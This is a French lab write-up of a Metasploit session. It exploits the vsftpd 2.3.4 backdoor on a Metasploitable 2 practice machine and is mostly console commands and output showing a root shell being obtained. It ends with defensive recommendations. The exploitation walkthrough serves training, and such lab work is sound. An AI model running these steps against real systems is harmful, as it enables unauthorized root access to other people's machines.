# Rapport Metasploit - Exploitation de VSFTPD 2.3.4

Ce rapport détaille une session Metasploit effectuée pour exploiter la vulnérabilité **VSFTPD 2.3.4 Backdoor** sur la cible `10.6.0.7`. L'objectif est d'obtenir un accès shell en tant que **root** sur la machine cible.

---

## Informations Générales

- **Outil Utilisé**: Metasploit Framework v6.4.44-dev
- **Modules Disponibles**:
  - **Exploits**: 2487
  - **Auxiliaries**: 1281
  - **Post-Exploits**: 431
  - **Payloads**: 1466
  - **Encoders**: 49
  - **Nops**: 13
  - **Evasions**: 9
- **Documentation**: [Metasploit Documentation](https://docs.metasploit.com/)

---

## Étapes de l'Exploitation

### 1. Lancement de Metasploit

```

msfconsole
```

**Sortie:**
```
Metasploit tip: View a module's description using info, or the enhanced 
version in your browser with info -d

                                                  `:oDFo:`                            
                                               ./ymM0dayMmy/.                          
                                            -+dHJ5aGFyZGVyIQ==+-                    
                                        `:sm⏣~~Destroy.No.Data~~s:`                
                                     -+h2~~Maintain.No.Persistence~~h+-              
                                 `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                              ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                           -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                          -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                          :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                          :we're.all.alike'`                     The.PFYroy.No.D7:  
                          :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                          :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                          :---srwxrwx:-.`                        `MS146.52.No.Per:    
                          :<script>.Ac816/                        sENbove3101.404:    
                          :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                          :09.14.2011.raid                       /STFU|wall.No.Pr:    
                          :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                          :#OUTHOUSE-  -s:                       /corykennedyData:    
                          :$nmap -oS                              SSo.6178306Ence:    
                          :Awsm.da:                            /shMTl#beats3o.No.:    
                          :Ring0:                             `dDestRoyREXKC3ta/M:    
                          :23d:                               sSETEC.ASTRONOMYist:    
                           /-                        /yo-    .ence.N:(){ :|: & };:    
                                                     `:Shall.We.Play.A.Game?tron/    
```

=[ metasploit v6.4.44-dev                          ]
+ -- --=[ 2487 exploits - 1281 auxiliary - 431 post       ]
+ -- --=[ 1466 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

```

*Remarque*: Metasploit Framework a démarré avec succès, affichant les informations sur les modules disponibles.

---

### 2. Recherche de Modules Relatifs à la Version 2.3.4

```

search 2.3.4
```

**Sortie:**
```
Matching Modules
===============

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   1    _ target: Automatic detection                          .                .          .      .
   2    _ target: Windows                                      .                .          .      .
   3    _ target: Linux                                        .                .          .      .
   4  auxiliary/gather/teamtalk_creds                           .                normal     No     TeamTalk Gather Credentials
   5  exploit/unix/ftp/vsftpd_234_backdoor                      2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
   6  exploit/unix/http/zivif_ipcheck_exec                      2017-09-01       excellent  Yes    Zivif Camera iptest.cgi Blind Remote Command Execution
   7  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution

Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/http/oscommerce_installer_unauth_code_exec
```

*Observation*: Le module **`exploit/unix/ftp/vsftpd_234_backdoor`** correspond à la recherche et est identifié comme une option viable pour l'exploitation.

---

### 3. Sélection du Module d'Exploitation

```

use 5
```

**Sortie:**
```
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

*Remarque*: Le module **VSFTPD 2.3.4 Backdoor** a été sélectionné avec succès.

---

### 4. Affichage des Informations du Module

```

show info
```

**Sortie:**
```
   Name: VSFTPD v2.3.4 Backdoor Command Execution
 Module: exploit/unix/ftp/vsftpd_234_backdoor
 Platform: Unix
     Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
    Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the       VSFTPD download
  archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
  June 30th 2011 and July 1st 2011 according to the most recent information
  available. This backdoor was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

View the full module info with the info -d command.
```

*Résumé*: Le module cible une faille de backdoor dans **vsftpd 2.3.4** permettant l'exécution de commandes arbitraires avec privilèges root.

---

### 5. Configuration de l'Adresse Cible

```

set RHOST 10.6.0.7
```

**Sortie:**
```
RHOST => 10.6.0.7
```

*Remarque*: L'adresse IP de la cible a été configurée avec succès.

---

### 6. Lancement de l'Exploitation

```

run
```

**Sortie:**
```
[*] 10.6.0.7:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.6.0.7:21 - USER: 331 Please specify the password.
[+] 10.6.0.7:21 - Backdoor service has been spawned, handling...
[+] 10.6.0.7:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.6.0.9:41769 -> 10.6.0.7:6200) at 2025-01-20 16:33:46 +0100
```

*Observation*: L'exploitation a réussi, ouvrant une session shell en tant que **root** sur la cible.

---

### 7. Vérification de l'Accès Obtenu

```

hostname && whoami
```

**Sortie:**
```
metasploitable
root
```

*Confirmation*: L'accès shell en tant que **root** a été obtenu avec succès sur la machine cible nommée **metasploitable**.

---

## Résumé des Actions

1. **Recherche du Module**: Identification du module d'exploitation `exploit/unix/ftp/vsftpd_234_backdoor`.
2. **Sélection du Module**: Utilisation du module identifié pour l'exploitation.
3. **Configuration**: Définition de la cible via `RHOST`.
4. **Exploitation**: Lancement de l'exploit et obtention d'un shell root.
5. **Vérification**: Confirmation de l'accès root sur la cible.

---

## Recommandations de Sécurité

*Note*: Ce rapport décrit une exploitation réussie sur une machine intentionnellement vulnérable (**Metasploitable 2**). Dans un environnement de production, les recommandations suivantes sont cruciales pour prévenir de telles exploitations :

1. **Mise à Jour des Services**: Assurer que tous les services, notamment FTP, SSH, et autres, sont régulièrement mis à jour pour corriger les vulnérabilités connues.
2. **Contrôle des Accès**: Désactiver les services non nécessaires et restreindre l'accès aux ports essentiels via des pare-feu.
3. **Authentification Sécurisée**: Utiliser des méthodes d'authentification robustes, désactiver l'authentification anonyme lorsque ce n'est pas nécessaire.
4. **Surveillance et Audit**: Mettre en place des systèmes de détection d'intrusion et auditer régulièrement les logs pour identifier toute activité suspecte.
5. **Utilisation de Protocoles Sécurisés**: Éviter les protocoles non sécurisés comme Telnet et privilégier SSH avec des configurations sécurisées.

---

## Conclusion

Cette session Metasploit démontre la vulnérabilité critique présente dans **vsftpd 2.3.4** due à un backdoor malveillant. L'exploitation a permis d'obtenir un accès root complet sur la machine cible. Bien que **Metasploitable 2** soit une machine de test conçue pour l'apprentissage et la pratique des techniques d'intrusion, les principes et recommandations de sécurité restent applicables à tout environnement réel pour renforcer la sécurité et prévenir les exploitations similaires.

---

**Fin du rapport**
